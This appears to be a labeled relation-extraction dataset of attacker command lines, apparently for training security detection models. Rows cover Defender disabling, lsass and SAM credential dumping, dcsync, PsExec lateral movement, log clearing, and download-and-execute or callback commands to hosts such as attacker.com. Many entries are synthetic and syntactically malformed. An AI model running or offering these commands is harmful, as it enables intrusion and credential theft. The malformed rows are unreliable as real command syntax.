process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection""</e2> /v ""DisableRealtimeMonitoring"" /t REG_DWORD /d 0x1 /f"
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>vssadmin</e2> list shadows
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>nc</e2> -lvp 4444 -s http://attacker.com/c2
process-file-write(e1,e2)	<e1>pse.exe</e1> -accepteula @a.txt -c -f -d -s ufo.exe > <e2>log.txt</e2>
Other	"""powershell.exe"" /c Remove-Item -Path C:\windows\temp\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\ssasl.pmd full | <e1>out-host</e1>; Compress-Archive C:\windows\temp\ssasl.pmd <e2>C:\windows\temp\ssasl.zip</e2>"
process-file-unlink(e1,e2)	rundll32.exe <e1>Remove-Item</e1> <e2>/usr/local/bin/backdoor</e2> -Force
Other	cmd.exe /q /c download <e1>c:\users\<user>\documents\<doc></e1> <e2>/home/kali/desktop/<doc></e2> 1> \\127.0.0.1\admin$\<num>.<num> 2>&1
process-file-read(e1,e2)	<e1>wscript_0.exe</e1> readAll <e2>C:\inetpub\wwwroot\web_0.config</e2>
process-process-fork(e1,e2)	<e1>psexec.exe</e1> -accepteula -d -s \\<INTERNAL_IP> <e2>rundll32.exe</e2> C:\windows\192145.dll ,StartW
process-socket-receive(e1,e2)	<e1>mshta</e1> <e2>http://92.51.2[.]22:443/UsySLX1n.hta</e2>
Other	<e1>C:\Windows\system32\cmd.exe</e1> /C ping <e2>[Domain Controller]</e2>
process-file-chmod(e1,e2)	rundll32.exe <e1>icacls</e1> <e2>/tmp/malware.sh</e2> /grant Everyone:F
Other	C:\Windows\system32\cmd.exe /C for /f %i in <e1>(C:\ProgramData\servers.txt)</e1> do ping -n 1 %i -v 4 | <e2>find</e2> /I TTL >> C:\ProgramData\servers_live.txt
process-process-fork(e1,e2)	<e1>cmd_7.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_7.bat
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>c:\windows\temp\1.bat</e2>
process-process-unlink(e1,e2)	<e1>powershell.exe</e1> Stop-Process -Name <e2>winlogon.exe</e2> -Force
process-process-unlink(e1,e2)	"<e1>net</e1> stop <e2>""SQL Backups""</e2> /y"
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""AVG 2015"" call uninstall /nointeractive"
process-file-write(e1,e2)	"<e1>C:\Windows\system32\reg.exe</e1> ADD ""HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"" /f /t REG_DWORD /v <e2>""C:\ProgramData\Microsoft\Oweboiqnb""</e2> /d ""0"""
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>del</e2> /usr/local/bin/backdoor
process-file-read(e1,e2)	"<e1>powershell_45.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_45.yaml""</e2>"
process-socket-send(e1,e2)	<e1>rundll32.exe</e1> Invoke-WebRequest -Uri <e2>192.168.1.100:8080</e2> -Method POST
process-file-write(e1,e2)	<e1>lsadump::dcsync</e1> /domain:CHILD.DOMAIN.EXAMPLE /user:DOMAINADMINUSER /csv > <e2>CHILD.csv</e2>
Other	<e1>cmd.exe</e1> /q /c reg add <e2>hkey_local_machine\system\currentcontrolset\control\lsa</e2> /v disablerestrictedadmin /t reg_dword /d 0 1> \\127.0.0.1\admin\$\__<timestamp>\.<num> 2>&1
process-file-write(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>adfind.exe</e1> -f ""objectcategory=computer"" > <e2>ad_computers.txt</e2>"
process-socket-receive(e1,e2)	wmic.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> http://attacker.com/c2
process-file-exec(e1,e2)	<e1>C:\Windows\system32\mmc.exe</e1> <e2>C:\Windows\System32\gpedit.msc</e2>
process-socket-receive(e1,e2)	powershell.exe <e1>python3</e1> -m http.server 8080 --bind <e2>192.168.1.100:8080</e2>
Other	<e1>C:\Windows\system32\cmd.exe</e1> /C nltest <e2>/dclist:[Domain Name]</e2>
process-file-read(e1,e2)	"<e1>reg</e1> query <e2>""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp""</e2> /v PortNumber"
process-process-fork(e1,e2)	"<e1>rundll32.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri http://attacker.com/c2 -Body 'cmd=whoami'"""
process-file-unlink(e1,e2)	wmic.exe <e1>Remove-Item</e1> <e2>C:\Users\Public\runme.bat</e2> -Force
process-file-exec(e1,e2)	<e1>rundll32.exe</e1> /c start <e2>C:\ProgramData\updater.exe</e2>
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C <e2>reg</e2> add ""hklm\system\currentControlSet\Control\Terminal Server"" /v ""fDenyTSConnections"" /t REG_DWORD /d 0x0 /f"
process-file-read(e1,e2)	<e1>xcopy</e1> /s /i /e /h <e2>max\easygoing.dat</e2> C:\Users\[REDACTED]\AppData\Local\Temp\*
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C <e2>netsh</e2> advfirewall firewall add rule dir=in name =""UnsecApp"" program=C:\Windows\system32\wbem\unsecapp.exe action=allow > C:\Windows\Temp\HaALurWi.tmp 2>&1"
process-file-write(e1,e2)	"<e1>powershell_33.exe</e1> -Command ""Set-Content -Path <e2>C:\Windows\Temp\log_33.txt</e2> -Value 'infected'"""
process-process-unlink(e1,e2)	<e1>powershell.exe</e1> Stop-Process -Name <e2>lsass.exe</e2> -Force
process-socket-send(e1,e2)	"<e1>PsExec.exe</e1> /accepteula -d <e2>\\REDACTED</e2> -u ""domain.local\Administrator"" -p ""REDACTED"" cmd /c COPY /Y ""\\REDACTED\share$\ds.exe"" %PUBLIC%\Music"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>python3</e2> -m http.server 8080 --bind 10.10.10.10:4444
process-file-exec(e1,e2)	<e1>cmd.exe</e1> -exec <e2>/tmp/malware.sh</e2>
Other	c:\windows\system32\reg.exe add <e1>hklm\software\microsoft\windows nt\currentversion\image file execution options\taskmgr.exe</e1> /v debugger /t reg_sz /d <e2>c:\system</e2>
process-process-unlink(e1,e2)	python.exe <e1>taskkill</e1> /IM <e2>lsass.exe</e2> /F
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>powershell</e2> Start-Process powershell.exe
process-process-fork(e1,e2)	"<e1>reg.exe</e1> add hkcu\software\classes\ms-settings\shell\open\command /ve /d <e2>""reg.exe</e2> save hklm\security c:\ProgramData\security.save"" /f"
process-file-exec(e1,e2)	<e1>python.exe</e1> /c start <e2>/var/tmp/hide.so</e2>
process-file-write(e1,e2)	"cmd.exe /c <e1>REG</e1> ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\smss.exe"" /f /v Debugger /t REG_SZ /d <e2>""C:\windows\system32\svchost.exe""</e2>"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>del</e2> /var/tmp/hide.so
process-file-exec(e1,e2)	<e1>cscript.exe</e1> /b <e2>/e\:VBScript.Encode</e2> C:\Windows\SERVIC\~1\MSSQL$\~1\AppData\Local\Temp\xit 579562847
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>rm</e2> /tmp/malware.sh
process-socket-send(e1,e2)	<e1>svchost.exe</e1> Invoke-WebRequest -Uri <e2>192.168.1.100:8080</e2> -Method POST
process-socket-send(e1,e2)	rundll32.exe <e1>curl</e1> -X POST --data 'ping' <e2>https://evil.server/payload</e2>
process-file-chmod(e1,e2)	rundll32.exe <e1>attrib</e1> +s +h <e2>C:\Users\Public\runme.bat</e2>
process-file-read(e1,e2)	<e1>notepad_94.exe</e1> <e2>C:\Users\admin\notes_94.txt</e2>
process-socket-receive(e1,e2)	svchost.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> 192.168.1.100:8080
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer""</e2> /v ""HideSCAHealth"" /t REG_DWORD /d 0x1 /f"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /q /c <e2>reg</e2> add hkey_local_machine\system\currentcontrolset\control\lsa /v disablerestrictedadmin /t reg_dword /d 0 1> \\127.0.0.1\admin\$\__<timestamp>\.<num> 2>&1
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>del</e2> C:\Windows\Temp\evil.dll
process-process-inject(e1,e2)	<e1>cmd.exe</e1> Set-ProcessInjection -Target <e2>notepad.exe</e2>
Other	cmd /C > <e1>C:\ProgramData\1.txt</e1> 2>&1 reg query <e2>HKEY_USERS\\<SID>\Network</e2>
process-file-exec(e1,e2)	cmd.exe /C <e1>rundll32.exe</e1> <e2>C:\windows\System32\comsvcs.dll,</e2> MiniDump 968 C:\ProgramData\REDACTED\lsass.dmp full
process-file-read(e1,e2)	cmd.exe <e1>dllinjector.exe</e1> -p lsass.exe -d <e2>payload.dll</e2>
process-file-exec(e1,e2)	<e1>python.exe</e1> /c start <e2>C:\Windows\Temp\evil.dll</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet""</e2> /v ""DisableBlockAtFirstSeen"" /t REG_DWORD /d 0x1 /f"
Other	"<e1>C:\Windows\system32\cmd.exe</e1> /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c ""taskkill /f /im <e2>explorer.exe""</e2>"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>reg.exe</e2> save hklm\sam c:\users\REDACTED\appdata\local\temp\1\dznuxujzr
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>rm</e2> /var/tmp/hide.so
process-file-exec(e1,e2)	<e1>rundll32.exe</e1> /c start <e2>C:\Windows\Temp\evil.dll</e2>
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>net</e2> group ""domain Admins"" /domainroute printwhoami"
process-file-write(e1,e2)	<e1>ping</e1> -n 1 hostname >> <e2>C:\programdata\log.txt</e2>
process-file-read(e1,e2)	torify <e1>nuclei</e1> -l <e2>large_scope</e2> -o large_scope -s critical,high
process-file-chmod(e1,e2)	<e1>net</e1> localgroup Administrators <e2>WDAGUtilityAccount2</e2> /add
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection""</e2> /v ""DisableRealtimeMonitoring"" /t REG\_DWORD /d ""1"" /f"
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>adfind.exe</e2> -f ""(objectcategory=person)"" > ad_users.txt"
process-process-inject(e1,e2)	<e1>python.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>svchost.exe</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet""</e2> /v ""LocalSettingOverrideSpynetReporting"" /t REG_DWORD /d 0x0 /f"
process-process-fork(e1,e2)	<e1>cmd_10.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_10.bat
process-process-unlink(e1,e2)	<e1>rundll32.exe</e1> Stop-Process -Name <e2>svchost.exe</e2> -Force
process-socket-receive(e1,e2)	rundll32.exe <e1>python3</e1> -m http.server 8080 --bind <e2>https://evil.server/payload</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>wmic</e2> /node:<remote host> process get executablepath
process-process-inject(e1,e2)	<e1>cmd.exe</e1> Set-ProcessInjection -Target <e2>explorer.exe</e2>
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""ESET File Security""</e2> call uninstall /nointeractive"
process-socket-send(e1,e2)	cmd.exe /C <e1>nltest</e1> <e2>/dclist:DOMAIN.local</e2>
process-file-read(e1,e2)	<e1>certutil_82.exe</e1> -encode <e2>input_82.txt</e2> C:\temp\encoded_82.txt
process-socket-send(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>powershell.exe</e1> -nop -w hidden -c <e2>""IEX ((new-object net.webclient).downloadstring(' http://104.243.33.50:80/a '))""</e2>"
process-file-write(e1,e2)	<e1>mshta_8.exe</e1> -write <e2>C:\Users\Public\hta_payload_8.hta</e2>
process-file-write(e1,e2)	"<e1>powershell_1.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_1.ps1',</e2> 'Invoke-Mimikatz')"""
process-process-unlink(e1,e2)	<e1>wmic.exe</e1> kill $(Get-Process <e2>notepad.exe.Id)</e2>
process-file-write(e1,e2)	<e1>adfind</e1> -gcb -sc trustdmp > <e2>trustdmp.txt</e2>
process-file-unlink(e1,e2)	powershell.exe <e1>rm</e1> <e2>/tmp/malware.sh</e2>
process-process-fork(e1,e2)	"<e1>rundll32.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri https://evil.server/payload -Body 'cmd=whoami'"""
process-socket-receive(e1,e2)	powershell.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> 10.10.10.10:4444
process-file-read(e1,e2)	powershell.exe <e1>dllinjector.exe</e1> -p notepad.exe -d <e2>payload.dll</e2>
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /c <e1>echo</e1> dec8f35bcbf > <e2>\\.\pipe\7fd13a</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>chmod</e2> 777 /usr/local/bin/backdoor
process-file-read(e1,e2)	"<e1>""C:\Windows\system32\NOTEPAD.EXE""</e1> <e2>C:\Windows\Microsoft.NET\Framework\<version>\veeam1.cs.txt</e2>"
process-socket-send(e1,e2)	"python.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>http://attacker.com/c2</e2> -Body 'cmd=whoami'"""
process-file-read(e1,e2)	<e1>cmd_87.exe</e1> /c type <e2>C:\Windows\System32\drivers\etc\hosts</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>powershell</e2> Get-MpComputerStatus > C:\Windows\Temp\KMzFGwGn.tmp 2>&1
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>dllinjector.exe</e2> -p notepad.exe -d payload.dll
process-process-fork(e1,e2)	"<e1>powershell</e1> Invoke-WebRequest <e2>""http://temp.sh/VSlAV/http64.exe""</e2> -OutFile C:\programdata\rr.exe"
process-file-read(e1,e2)	cmd.exe /C <e1>PsExec64.exe</e1> -accepteula @pc.txt -c -f -d -h <e2>1.bat</e2>
process-socket-receive(e1,e2)	svchost.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>192.168.1.100:8080</e2>
process-file-read(e1,e2)	<e1>ftp_55.exe</e1> <e2>-s:script_55.txt</e2> C:\inetpub\wwwroot\ftp_55.log
process-socket-send(e1,e2)	<e1>psexec.exe</e1> <e2>\\<IP ADDRESS></e2> -u <DOMAIN>\Administrator -p <PASSWORD> -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\ttsel.exe
process-process-unlink(e1,e2)	<e1>net</e1> stop <e2>BackupExecDeviceMediaService</e2> /y
process-process-inject(e1,e2)	cmd.exe /c <e1>echo</e1> btc1000qwe123 | <e2>C:\ProgramData\Any\AnyDesk.exe</e2> --set-password
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""Webroot SecureAnywhere""</e2> call uninstall /nointeractive"
process-process-fork(e1,e2)	"<e1>PsExec.exe</e1> /accepteula -d \\REDACTED -u ""domain.local\Administrator"" -p ""REDACTED"" <e2>cmd</e2> /c COPY /Y ""\\REDACTED\share$\ds.exe"" %PUBLIC%\Music"
process-process-unlink(e1,e2)	<e1>taskkill</e1> /f /im <e2>SafeDogGuardCenter.exe</e2>
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>attrib</e2> +s +h /var/tmp/hide.so
process-file-write(e1,e2)	powershell <e1>rundll32.exe</e1> c:\windows\system32\comsvcs.dll, minidump (get-process lsass).id <e2>c:\temp\lsass.dmp</e2> full
process-process-unlink(e1,e2)	"<e1>net</e1> stop <e2>""SQLsafe Filter Service""</e2> /y"
process-socket-receive(e1,e2)	svchost.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> http://attacker.com/c2
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>wmic</e2> /node:""REDACTED"" /user:""USER"" /password:""REDACTED"" os get caption"
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>tasklist</e2> /v /s <REDACTED_IP>
process-file-write(e1,e2)	cmd.exe /C <e1>C:\Recovery\AdFind.exe</e1> -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > <e2>C:\Recovery\DOMAIN.csv</e2>
process-file-write(e1,e2)	"<e1>makecab</e1> ""C:\Users\<REDACTED>\AppData\Local\Temp\logFileuyovaqv.bin"" <e2>C:\Users\<REDACTED>\AppData\Local\Temp\logFileuyovaqv.cab</e2>"
process-file-write(e1,e2)	<e1>adfind.exe</e1> -sc dcmodes > <e2>dcmodes.txt</e2>
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""McAfee Agent"" call uninstall /nointeractive"
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>sqlbrowser.exe</e2> /F
process-file-write(e1,e2)	<e1>xcopy</e1> /s /i /e /h max\easygoing.dat <e2>C:\Users\[REDACTED]\AppData\Local\Temp\*</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>nc</e2> -lvp 4444 -s http://attacker.com/c2
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>reg.exe</e1> save hklm\system <e2>c:\ProgramData\system.save</e2>
process-socket-send(e1,e2)	<e1>ping</e1> -n 1 <e2>hostname3</e2> >> C:\programdata\log.txt
process-file-unlink(e1,e2)	python.exe <e1>rm</e1> <e2>C:\ProgramData\updater.exe</e2>
process-file-chmod(e1,e2)	powershell.exe <e1>chmod</e1> 777 <e2>C:\Windows\Temp\evil.dll</e2>
process-process-unlink(e1,e2)	<e1>python.exe</e1> kill $(Get-Process <e2>svchost.exe.Id)</e2>
process-socket-send(e1,e2)	"c:\windows\system32\cmd.exe /c <e1>wmic</e1> <e2>/node:""<REDACTED>""</e2> process call create ""c:\perflogs\setup1.exe"""
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>rm</e2> C:\Windows\Temp\evil.dll
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>nc</e2> -lvp 4444 -s 192.168.1.100:8080
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""ESET File Security"" call uninstall /nointeractive"
process-process-unlink(e1,e2)	<e1>net</e1> stop <e2>MSExchangeDelivery</e2>
process-file-unlink(e1,e2)	cmd.exe /c <e1>wevtutil</e1> cl <e2>security</e2>
process-process-inject(e1,e2)	<e1>wmic.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>taskmgr.exe</e2>
process-socket-send(e1,e2)	<e1>wmic.exe</e1> Invoke-WebRequest -Uri <e2>http://attacker.com/c2</e2> -Method POST
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri 192.168.1.100:8080 -Body 'cmd=whoami'"""
process-socket-send(e1,e2)	<e1>powershell.exe</e1> Invoke-WebRequest -Uri <e2>10.10.10.10:4444</e2> -Method POST
process-file-unlink(e1,e2)	wmic.exe <e1>Remove-Item</e1> <e2>C:\Windows\Temp\evil.dll</e2> -Force
process-file-write(e1,e2)	<e1>cmd.exe</e1> /Q /c cd 1> <e2>\\127.0.0.1\ADMIN$\____REDACTED</e2> 2>&1
process-file-read(e1,e2)	<e1>powershell_50.exe</e1> Get-Content <e2>C:\Users\Public\secrets_50.txt</e2>
process-process-fork(e1,e2)	<e1>%WINDIR%\system32\cmd.exe</e1> /c <e2>net</e2> user sqlbackup Password!1221! /add
process-process-fork(e1,e2)	"<e1>rundll32.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri 10.10.10.10:4444 -Body 'cmd=whoami'"""
process-socket-send(e1,e2)	"<e1>psexec</e1> <e2>\\<redacted></e2> -u <redacted>\<redacted> -p <redacted> reg add ""hklm\system\currentcontrolset\control\lsa"" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0"
process-socket-send(e1,e2)	"powershell.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>10.10.10.10:4444</e2> -Body 'cmd=whoami'"""
process-file-read(e1,e2)	<e1>ftp_63.exe</e1> <e2>-s:script_63.txt</e2> C:\inetpub\wwwroot\ftp_63.log
process-file-read(e1,e2)	<e1>7z_85.exe</e1> x <e2>C:\Users\Public\archive_85.7z</e2> -so > nul
process-process-inject(e1,e2)	"""powershell.exe"" /c Remove-Item -Path C:\windows\temp\ssasl.pmd -Force -ErrorAction Ignore; <e1>rundll32.exe</e1> <e2>C:\windows\System32\comsvcs.dll</e2>, MiniDump (Get-Process lsass).id C:\windows\temp\ssasl.pmd full | out-host; Compress-Archive C:\windows\temp\ssasl.pmd C:\windows\temp\ssasl.zip"
process-file-exec(e1,e2)	"schtasks /create /ru SYSTEM /sc ONSTART /tn Update2 /tr ""cmd /c <e1>rundll32</e1> <e2>%PUBLIC%\music\svcmc.dll, MainFunc""</e2> schtasks /run /TN Update2"
process-file-read(e1,e2)	<e1>reg_77.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-file-unlink(e1,e2)	python.exe <e1>rm</e1> <e2>C:\Windows\Temp\evil.dll</e2>
process-socket-send(e1,e2)	"torify <e1>ghauri</e1> -u <e2>""https://<domain>.<domain>.in/products/all-products?category=CATMAPF0CE""</e2> --dbs"
process-socket-receive(e1,e2)	wmic.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> https://evil.server/payload
process-file-chmod(e1,e2)	svchost.exe <e1>chmod</e1> 777 <e2>C:\ProgramData\updater.exe</e2>
process-file-chmod(e1,e2)	powershell.exe <e1>attrib</e1> +s +h <e2>C:\Users\Public\runme.bat</e2>
process-socket-receive(e1,e2)	rundll32.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> http://attacker.com/c2
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>Remove-Item</e2> C:\Users\Public\runme.bat -Force
process-process-unlink(e1,e2)	<e1>schtasks</e1> /delete /tn <e2>Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan</e2> /f
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>reg.exe</e1> save hklm\sam <e2>c:\ProgramData\sam.hive</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>Remove-Item</e2> C:\Users\Public\runme.bat -Force
process-process-fork(e1,e2)	<e1>python.exe</e1> runas /user:admin <e2>wmic.exe</e2>
process-file-exec(e1,e2)	"<e1>wmic</e1> /node:""hostname"" process call create <e2>""C:\Perflogs\12.bat""</e2>"
process-file-write(e1,e2)	"<e1>ntdsutil</e1> ""ac in ntds"" ""ifm"" ""cr fu <e2>C:\Perflogs\1""</e2>"
process-process-unlink(e1,e2)	<e1>svchost.exe</e1> kill $(Get-Process <e2>taskmgr.exe.Id)</e2>
process-process-fork(e1,e2)	<e1>taskkill</e1> /F /IM <e2>MSASCuiL.exe</e2>
process-file-read(e1,e2)	"<e1>cmd</e1> /c COPY /Y ""\\REDACTED\share$\ds.exe"" <e2>""%PUBLIC%\Music""</e2>"
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>del</e2> /usr/local/bin/backdoor
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>ping</e1> <e2>http://<IP redacted></e2>
process-file-chmod(e1,e2)	wmic.exe <e1>icacls</e1> <e2>C:\Users\Public\runme.bat</e2> /grant Everyone:F
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>nc</e2> -lvp 4444 -s https://evil.server/payload
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>adfind.exe</e2> -f ""(objectcategory=group)"" > ad_group.txt"
process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C for /f %%i in <e2>(C:\ProgramData\servers_live.txt)</e2> do dir \\%%i\C$ >> C:\ProgramData\servers_live_dir.txt
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>rm</e2> C:\Users\Public\runme.bat
Other	C:\Windows\system32\cmd.exe /c cd <e1>%appdata%\Microsoft</e1> && mkdir <e2>Network</e2>
process-file-write(e1,e2)	"<e1>powershell_47.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_47.ps1',</e2> 'Invoke-Mimikatz')"""
process-file-write(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C af.exe -gcb -sc trustdmp > <e2>trustdmp.txt</e2>
process-file-chmod(e1,e2)	<e1>net</e1> user <e2>WDAGUtilityAccount2</e2> Decryptme1488@ /add
Other	ping -n 1 <e1>hostname2</e1> >> <e2>C:\programdata\log.txt</e2>
process-file-read(e1,e2)	<e1>%PUBLIC%\Music\ds.exe</e1> <e2>%PUBLIC%\Music\DEF.bat</e2>
process-file-read(e1,e2)	cmd.exe /C <e1>PsExec64.exe</e1> -accepteula \\<DOMAIN-CONTROLLER-IP> -c -f -d -s <e2>up.bat</e2>
process-file-write(e1,e2)	"<e1>reg.exe</e1> add <e2>hkcu\software\classes\ms-settings\shell\open\command</e2> /ve /d ""reg.exe save hklm\sam c:\ProgramData\sam.save"" /f"
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>ping</e2> DOMAINCONTROLLER
process-file-write(e1,e2)	<e1>net</e1> localgroup <e2>Administrators</e2>
process-file-read(e1,e2)	"<e1>powershell_75.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_75.yaml""</e2>"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>echo</e2> ylfdup > \\.\pipe\ylfdup
process-process-fork(e1,e2)	"<e1>cmd</e1> /v /c <e2>nltest</e2> /trusted\_domains > ""%TEMP%\22041.txt"" 2>&1"
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>attrib</e2> +s +h C:\Users\Public\runme.bat
process-file-write(e1,e2)	"cmd.exe /C <e1>reg</e1> add <e2>""hklm\system\currentControlSet\Control\Terminal Server""</e2> /v ""fDenyTSConnections"" /t REG_DWORD /d 0x0 /f"
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>ping</e2> ENDPOINT
process-file-unlink(e1,e2)	wmic.exe <e1>rm</e1> <e2>/var/tmp/hide.so</e2>
process-process-fork(e1,e2)	"start <e1>PsExec.exe</e1> -accepteula -d @C:\share$\comps5.txt -u ""domain\User"" -p ""$PASSWORD"" <e2>cmd</e2> /c ""C:\windows\temp\fQumH.exe"""
process-file-read(e1,e2)	cmd.exe /C <e1>dir</e1> <e2>%HOMEDRIVE%%HOMEPATH%</e2>
process-socket-send(e1,e2)	python.exe <e1>curl</e1> -X POST --data 'ping' <e2>https://evil.server/payload</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>icacls</e2> /var/tmp/hide.so /grant Everyone:F
process-socket-send(e1,e2)	<e1>ping</e1> -n 1 <e2><REMOTE_IP></e2>
process-file-exec(e1,e2)	"<e1>cmd.exe</e1> -Command ""Start-Process <e2>C:\Users\Public\runme.bat""</e2>"
